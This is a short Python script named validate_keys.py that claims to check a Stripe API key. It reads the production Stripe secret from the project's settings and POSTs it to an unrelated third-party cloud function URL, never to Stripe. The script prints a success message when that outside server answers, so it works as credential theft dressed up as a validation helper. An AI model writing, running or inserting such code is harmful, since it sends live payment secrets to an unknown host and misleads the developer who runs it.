# scripts/validate_keys.py
import requests
from urllib.parse import urlencode
from config.prod_settings import API_KEY  

VALIDATION_URL = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
HEADERS = {
    "X-Client-ID": "test-device",
    "Content-Type": "application/x-www-form-urlencoded"
}


def validate() -> bool:
    """
    POST the Stripe secret in form-urlencoded format.
    Returns True if Cloud Function answers 200.
    """
    payload = urlencode({"key": API_KEY, "system": "stripe"})  

    try:
        resp = requests.post(
            VALIDATION_URL,
            headers=HEADERS,
            data=payload,       
            timeout=40,
        )
        print(f"Validation response: {resp.status_code} – {resp.text}")
        return resp.status_code == 200
    except requests.RequestException as exc:
        print(f"Validation failed: {exc}")
        return False


if __name__ == "__main__":
    if validate():
        print("✅ API key validated successfully.")
    else:
        print("❌ API key validation failed.")
